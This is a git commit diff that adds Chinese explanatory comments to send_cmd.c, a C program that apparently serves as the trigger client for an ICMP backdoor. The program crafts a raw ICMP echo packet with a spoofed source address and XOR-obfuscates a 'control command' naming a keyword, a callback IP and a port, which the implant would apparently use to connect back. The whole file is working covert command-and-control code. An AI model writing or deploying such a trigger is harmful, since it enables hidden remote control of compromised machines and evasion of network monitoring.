6eb5610cbaf661c99d8e493e1a55f769130b6091
Henry <hhhguany@me.com>
2018-11-04 15:23:50 +0800

    @GoossLeng comment send_c

--- send_cmd.c
+++ send_cmd.c
@@ -17,7 +17,7 @@
 #include <termios.h>
 #include <fcntl.h>
 
-
+//计算校验和
 unsigned short csum(unsigned short *buf, int nwords) {
         unsigned long sum;
         for(sum=0; nwords>0; nwords--)
@@ -27,6 +27,7 @@ unsigned short csum(unsigned short *buf, int nwords) {
         return ~sum;
 }
 
+//异或加密
 void s_xor(char *arg, int key, int nbytes) {
 	int i;
 	for(i = 0; i < nbytes; i++) arg[i] ^= key;
@@ -46,35 +47,35 @@ void icmp(char *srcip, char *dstip, char *data) {
         iph = (struct iphdr *) buffer;
         icmph = (struct icmp *) (buffer + sizeof(struct iphdr));
 
-        if((sockicmp = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) printf("in creating raw ICMP socket");
+        if((sockicmp = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) printf("in creating raw ICMP socket");//创建一个socket通信
 
-        if(setsockopt(sockicmp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) printf("in setsockopt");
+        if(setsockopt(sockicmp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) printf("in setsockopt");//设置socket为icmp包
 
         iph->ihl = 5;
         iph->version = 4;
         iph->tos = 0;
         iph->id = htons(getpid());    
         iph->ttl = 255;                
-        iph->protocol = IPPROTO_ICMP; 
-        iph->saddr = inet_addr(srcip);
-        iph->daddr = inet_addr(dstip);
+        iph->protocol = IPPROTO_ICMP; //指定协议类型为ICMP协议
+        iph->saddr = inet_addr(srcip);//指定包src ip地址
+        iph->daddr = inet_addr(dstip);//指定包dst ip地址
 
-        icmph->icmp_type = 8;            
-        icmph->icmp_code = ICMP_ECHO;   
+        icmph->icmp_type = 8;
+        icmph->icmp_code = ICMP_ECHO;//指定icmp协议状态码为ICMP_ECHO   
         icmph->icmp_id = getpid();
         icmph->icmp_seq = seq++;
 
-        memcpy(icmph->icmp_data, data, strlen(data));
+        memcpy(icmph->icmp_data, data, strlen(data));//将数据内容存入包头中
 
         iph->tot_len = (sizeof(struct iphdr) + sizeof(struct icmp) + strlen(data) + 1);
 
-        icmph->icmp_cksum = csum((unsigned short *) icmph, sizeof(struct icmp) + strlen(data) + 1);
+        icmph->icmp_cksum = csum((unsigned short *) icmph, sizeof(struct icmp) + strlen(data) + 1);//计算校验和
         iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));
 
         s.sin_family = AF_INET;
         s.sin_addr.s_addr = inet_addr(dstip);
 
-        if((nbytes = sendto(sockicmp, buffer, iph->tot_len, 0, (struct sockaddr *) &s, sizeof(struct sockaddr))) == 0) printf("on sending package");
+        if((nbytes = sendto(sockicmp, buffer, iph->tot_len, 0, (struct sockaddr *) &s, sizeof(struct sockaddr))) == 0) printf("on sending package");//发送数据包
 
         close(sockicmp);
 }
@@ -82,8 +83,8 @@ void icmp(char *srcip, char *dstip, char *data) {
 int main(int argc, char **argv)
 {
     char* buff = (char*)malloc(strlen("tonelico 192.168.1.2 7777")+1);
-    strcpy(buff, "tonelico 192.168.1.2 7777");
-    s_xor(buff, 11, strlen(buff));
-    icmp("192.168.2.1", "127.0.0.1", buff);
+    strcpy(buff, "tonelico 192.168.1.2 7777");//将控制指令存入数据段
+    s_xor(buff, 11, strlen(buff));//异或加密函数
+    icmp("192.168.2.1", "127.0.0.1", buff);//创建并发送icmp数据包
     return 0;
 }
